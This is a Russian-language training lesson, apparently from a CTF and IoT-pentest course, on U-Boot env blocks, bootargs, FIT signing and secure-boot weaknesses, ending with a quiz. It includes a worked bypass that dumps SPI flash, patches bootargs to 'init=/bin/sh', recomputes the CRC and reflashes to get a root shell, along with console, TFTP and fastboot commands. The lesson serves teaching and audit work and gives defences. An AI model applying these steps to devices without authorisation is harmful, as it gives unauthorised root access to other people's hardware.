---
id: hardware-uboot-deep
title: "U-Boot глубоко: env, bootargs, secure boot"
category: hardware
parent: hardware-uboot
difficulty: hard
order: 1
tags: [uboot, bootloader, bootargs, embedded]
prerequisites: [hardware-uboot, hardware-bootloader]
useful_for:
  - "CTF-задачи категории Hardware"
  - "Пентест IoT: доступ и модификация прошивки"
  - "Аудит secure boot и цепочки доверия"
estimated_minutes: 60
summary: "Глубокое погружение в U-Boot: бинарный формат окружения (CRC, избыточность), fw_setenv/fw_printenv, FIT-образы и подписи, secure/verified boot, bootcount/altbootcmd, fastboot/DFU и практические обходы цепочки доверия."
---

Базовый урок `hardware-uboot` показывает, как прервать автозагрузку и поправить `bootargs`. Здесь мы спускаемся на уровень ниже: как устроен бинарный env-блок, почему его CRC важен для атакующего, как U-Boot проверяет подписи FIT-образов, что такое secure boot и где он обычно настроен неправильно. Secure boot в U-Boot — это не «включён/выключен», а целая цепочка проверок с множеством точек отказа, и именно на этой глубине пентест встраиваемых устройств приносит результат.

## Зачем этот урок

U-Boot — это последний рубеж перед ядром Linux. Если цепочка доверия (ROM → SPL → U-Boot → FIT → ядро) разорвана хотя бы в одном месте, весь secure boot бесполезен. Практика показывает: чаще всего слабое звено — сам U-Boot (доступная консоль, неверный `bootargs`, отсутствие проверки подписи) или env-блок, который можно подменить на флеше. Понимание формата env, FIT и подписей нужно, чтобы: (1) находить обходы, (2) корректно модифицировать образы, (3) оценивать защиту IoT-устройства в отчёте. Этот урок — углубление, а не повторение основ.

## U-Boot: архитектура и фазы

Типичная цепочка загрузки SoC:

1. **BootROM** — неизменяемый код в кремнии, читает первый загрузчик с носителя.
2. **SPL / MLO** (Secondary Program Loader) — инициализирует DRAM, загружает U-Boot proper.
3. **U-Boot proper** — полноценный загрузчик: консоль, драйверы, загрузка ОС.
4. **FIT-образ** — ядро + device tree + initramfs с подписью.
5. **Ядро Linux**.

Полезные для атакующего факты:

- SPL и U-Boot могут находиться на eMMC/SPI-NOR/NAND в известных смещениях;
- U-Boot proper часто содержит **environment** (env) в отдельной области с известным offset;
- консоль U-Boot по UART даёт команды `setenv`, `saveenv`, `boot`, `tftp`, `mmc`, `sf`, `nand`.

## Переменные окружения и env-блок

Окружение U-Boot — это либо **встроенное по умолчанию** (`CONFIG_EXTRA_ENV_SETTINGS`, `default_environment`), либо **сохранённое на носителе** (redundant env в двух копиях). Бинарный формат env:

```
struct environment_s {
  uint32_t crc;        // CRC32 от данных
  unsigned char flags; // флаги (например, redundant)
  unsigned char data[ENV_SIZE];  // "key=value\0key=value\0...\0\0"
};
```

Ключевые особенности:

- **CRC32** покрывает только `data`; при правке env вручную нужно пересчитать CRC, иначе U-Boot откатится к default env (или выдаст «bad CRC, using default environment»).
- **Redundant env** хранится в двух копиях (`env` и `env_redundant`); U-Boot выбирает валидную. Подмена обеих копий на флеше — путь к контролю над загрузкой.
- **Флаги** указывают активную копию и признак «obsolete».

Инструменты для работы с env:

```bash
# fw_printenv / fw_setenv (из u-boot-tools) — читать/писать env из Linux
sudo fw_printenv                 # вывести все переменные
sudo fw_printenv bootargs
sudo fw_setenv bootargs "console=ttyS0,115200 root=/dev/mmcblk0p2 rw"
sudo fw_setenv bootdelay 5
# Конфиг /etc/fw_env.config задаёт offset и размер env на устройстве

# Ручной разбор env-дампа (CRC32 + строки)
python3 - <<'PY'
import struct, zlib
data = open('env.bin','rb').read()
crc = struct.unpack('<I', data[:4])[0]
body = data[5:]            # 4 байта CRC + 1 байт flags
print('crc ok:', zlib.crc32(body) & 0xffffffff == crc)
for kv in body.split(b'\x00'):
    if kv: print(kv.decode(errors='replace'))
PY

# Пересчёт CRC после правки
python3 - <<'PY'
import struct, zlib
body = b'bootdelay=1\x00bootargs=console=ttyS0\x00\x00'
open('env_new.bin','wb').write(struct.pack('<I', zlib.crc32(body)&0xffffffff) + b'\x01' + body)
PY
```

Настройка `/etc/fw_env.config` (пример):

```
/dev/mtd0 0x40000 0x2000 0x2000
/dev/mtd0 0x42000 0x2000 0x2000
```

Здесь: устройство, offset, размер сектора, размер env.

## bootargs и bootcmd

- **`bootcmd`** — последовательность команд автозагрузки (например, `run mmcboot`). Именно её правят, чтобы загрузить своё ядро или получить shell.
- **`bootargs`** — строка аргументов ядра. Классические трюки:

```
setenv bootargs console=ttyS0,115200 root=/dev/mmcblk0p2 rw init=/bin/sh
setenv bootargs console=ttyS0,115200 root=/dev/mmcblk0p2 rw single
setenv bootargs console=ttyS0,115200 root=/dev/nfs nfsroot=192.168.1.10:/srv/nfs ip=dhcp
```

`init=/bin/sh` даёт root-shell без логина; `single` — однопользовательский режим. Если secure boot не проверяет `bootargs`, это прямой обход.

## Консоль, autoboot и прерывание

При включении U-Boot ждёт `bootdelay` секунд, выводя «Hit any key to stop autoboot». Нажатие клавиши по UART даёт консоль. Если `bootdelay=0`, прервать нельзя — тогда правят env на флеше или замыкают ноги флеша (для SPI-NOR). Парольная защита консоли (`CONFIG_AUTOBOOT_KEYED`, `bootstopkeysha256`) иногда включена, но часто с дефолтным/пустым паролем.

## Secure boot и verified boot

Secure boot в U-Boot реализуется через проверку подписи FIT-образа (RSA/ECDSA). Ключевые механизмы:

- **FIT-образ** (`.itb`) — контейнер с ядром, dtb, initramfs и узлом `signature`.
- **Публичный ключ** встроен в U-Boot через control DTB (`.dtb` с узлом `/signature/key-...`).
- **Проверка**: `bootm`/`booti` вызывает `fit_check_sign`, сверяя подпись с ключом.
- **`CONFIG_FIT_SIGNATURE`**, **`CONFIG_RSA`**, **`CONFIG_SPL_FIT_SIGNATURE`** — опции сборки.

Слабости и обходы:

- Подпись проверяется только для FIT, но **не для `bootargs`** — их можно подменить;
- если U-Boot не собран с `FIT_SIGNATURE`, проверки нет вообще;
- ключ может быть отладочным (публично известным);
- **env может быть не защищён**: подмена `bootcmd`/`bootargs` на флеше обходит проверку;
- **SPL** иногда не проверяет U-Boot proper — тогда можно подменить сам загрузчик;
- **rollback**: без anti-rollback можно откатиться на уязвимую версию (см. `hardware-firmware-rollback`).

## Практические атаки

- **Правка env на флеше**: снять дамп SPI-NOR/eMMC, найти env, поменять `bootargs` на `init=/bin/sh`, пересчитать CRC, записать обратно.
- **`saveenv` из консоли**: если консоль доступна, просто `setenv bootargs ...; saveenv; boot`.
- **TFTP/USB boot**: если `bootcmd` позволяет, загрузить своё ядро (`tftpboot 0x80000000 zImage; bootz`).
- **fastboot/DFU**: если включены, можно прошить разделы (`fastboot flash boot ...`).
- **UART boot / BootROM**: некоторые SoC позволяют загрузить код через UART (режим восстановления) — это обходит secure boot полностью.
- **Замыкание флеша**: принудительный режим, когда env не читается и U-Boot падает в default (иногда в консоль).

## Инструменты и команды

```bash
# U-Boot console (через picocom/minicom)
picocom -b 115200 /dev/ttyUSB0
# прервать автозагрузку: нажать любую клавишу
# команды:
printenv
setenv bootargs console=ttyS0,115200 root=/dev/mmcblk0p2 rw init=/bin/sh
saveenv
boot
# сеть
setenv ipaddr 192.168.1.50
setenv serverip 192.168.1.10
tftpboot 0x80000000 zImage
tftpboot 0x82000000 dtb
bootz 0x80000000 - 0x82000000
# флеш
sf probe 0:0
sf read 0x80000000 0x100000 0x2000
sf write 0x80000000 0x100000 0x2000
mmc dev 0
mmc read 0x80000000 0x1000 0x2000

# mkimage — сборка FIT-образа
mkimage -f image.its image.itb
mkimage -l image.itb            # листинг
mkimage -F -k keys -K u-boot.dtb image.itb   # подписать FIT

# fw_env
sudo fw_printenv
sudo fw_setenv bootdelay 5
```

`image.its` (пример):

```
/dts-v1/;
/ {
  description = "kernel+dtb";
  images {
    kernel { data = /incbin/("zImage"); type = "kernel"; arch = "arm"; os = "linux";
             compression = "none"; load = <0x80008000>; entry = <0x80008000>; hash { algo = "sha256"; }; };
    fdt { data = /incbin/("board.dtb"); type = "flat_dt"; arch = "arm"; compression = "none"; hash { algo = "sha256"; }; };
  };
  configurations {
    default = "conf";
    conf { kernel = "kernel"; fdt = "fdt"; signature { algo = "sha256,rsa2048"; key-name-hint = "dev"; }; };
  };
};
```

## Разобранный пример: обход через env

**Дано:** IoT-устройство, U-Boot с `bootdelay=1`, secure boot включён для FIT. Консоль по UART, но `bootdelay=0` в сохранённом env — прервать нельзя.

**Шаг 1 — снять флеш.** SPI-NOR читаем программатором (CH341A) или через `flashrom`:

```bash
$ flashrom -p ch341a_spi -r dump.bin
Found Winbond flash chip "W25Q128" (16384 kB) ...
```

**Шаг 2 — найти env.** Ищем строку `bootargs=` в дампе:

```bash
$ grep -abo "bootargs=" dump.bin | head
0x41000:bootargs=console=ttyS0,115200 root=/dev/mtdblock3 ro
```

**Шаг 3 — править.** Меняем `ro` на `rw init=/bin/sh` и пересчитываем CRC (см. python-скрипт выше). Записываем обратно.

**Шаг 4 — проверить.** U-Boot читает подменённый env; `bootargs` не подписан, поэтому secure boot не мешает. Ядро стартует в root-shell.

```bash
$ flashrom -p ch341a_spi -w dump_patched.bin
```

**Шаг 5 — если env защищён.** Тогда ищем обход на уровне SPL: если SPL не проверяет подпись U-Boot proper, подменяем U-Boot целиком (своя сборка с консолью).

## Edge cases и защита

- **CRC env.** Без пересчёта CRC подмена не сработает — U-Boot упадёт в default env.
- **Redundant env.** Нужно подменять обе копии (или ту, что активна по флагу).
- **SPI-NOR vs eMMC.** На eMMC env может быть в GPT-разделе; на SPI-NOR — по offset.
- **Secure boot + signed env.** Редко, но бывает: тогда env тоже подписан, и подмена отпадает.
- **Anti-rollback.** Без него можно откатиться на уязвимую версию.
- **Пароль консоли.** `CONFIG_AUTOBOOT_KEYED` защищает консоль, но дефолтные пароли часты.
- **Защита:** подписывать env, включать FIT_SIGNATURE и SPL_FIT_SIGNATURE, anti-rollback, отключать UART/DFU/fastboot в релизе, пароль консоли, проверять bootargs.

## Частые ошибки

- Править env, не пересчитав CRC — «bad CRC, using default environment».
- Подменять только одну копию redundant env.
- Считать, что secure boot защищает `bootargs` — обычно нет.
- Игнорировать SPL: если он не проверяет U-Boot, вся защита обходится.
- Забывать про anti-rollback и считать версию неизменяемой.
- Ломать загрузчик на своём устройстве без бэкапа дампа.

## Что дальше / решение

- **Снять полный дамп** флеша перед экспериментами.
- **Разобрать FIT-образ** (`mkimage -l`, `dumpimage`) и понять, что подписано.
- **Проверить цепочку**: BootROM → SPL → U-Boot → FIT. Найти неподписанное звено.
- **Связка**: `hardware-secure-boot`, `hardware-measured-boot`, `hardware-firmware-rollback`.
- **Защита:** подпись env и FIT, anti-rollback, отключение отладочных интерфейсов.

## Справочные таблицы

| Переменная | Смысл |
|-----------|-------|
| `bootcmd` | команды автозагрузки |
| `bootargs` | аргументы ядра |
| `bootdelay` | пауза автозагрузки |
| `ipaddr`/`serverip` | сеть |
| `bootcount`/`altbootcmd` | счётчик и резервная загрузка |

| Инструмент | Назначение |
|-----------|-----------|
| `fw_printenv`/`fw_setenv` | чтение/запись env |
| `mkimage` | сборка/подпись FIT |
| `dumpimage` | разбор FIT |
| `flashrom` | чтение/запись SPI-NOR |
| `picocom`/`minicom` | UART-консоль |

| Слой | Проверка подписи |
|------|------------------|
| BootROM | обычно да (efuse) |
| SPL | иногда (SPL_FIT_SIGNATURE) |
| U-Boot proper | редко |
| FIT (kernel) | да, если FIT_SIGNATURE |
| bootargs/env | обычно нет |

## Квиз

```quiz
- question: "Что покрывает CRC32 в бинарном env-блоке U-Boot?"
  options:
    - "Только поле data с переменными"
    - "Весь блок вместе с CRC"
    - "Только заголовок"
    - "Ничего, CRC отсутствует"
  answer: 0
- question: "Почему подмена bootargs часто обходит secure boot?"
  options:
    - "bootargs обычно не подписаны, проверяется только FIT-образ"
    - "bootargs шифруются AES"
    - "bootargs хранятся в BootROM"
    - "bootargs проверяются efuse"
  answer: 0
- question: "Что произойдёт, если записать env с неверным CRC?"
  options:
    - "U-Boot откатится к default environment (bad CRC)"
    - "Устройство сгорит"
    - "CRC пересчитается автоматически"
    - "Ядро не загрузится из-за подписи"
  answer: 0
- question: "Какой инструмент подписывает FIT-образ?"
  options:
    - "mkimage -F -k keys"
    - "flashrom"
    - "picocom"
    - "fw_printenv"
  answer: 0
- question: "Какая функция даёт резервную загрузку при неудаче?"
  options:
    - "bootcount + altbootcmd"
    - "saveenv"
    - "printenv"
    - "sf probe"
  answer: 0
```

## Где пригодится

- **CTF:** Hardware-задачи с загрузчиками, env и secure boot.
- **Пентест IoT:** получение доступа через U-Boot, модификация прошивки.
- **Аудит цепочки доверия:** оценка secure boot в отчётах.
- **Работа:** разработка и защита встраиваемых загрузчиков.
- **Дальше по дереву:** `hardware-uboot`, `hardware-secure-boot`, `hardware-firmware-rollback`.
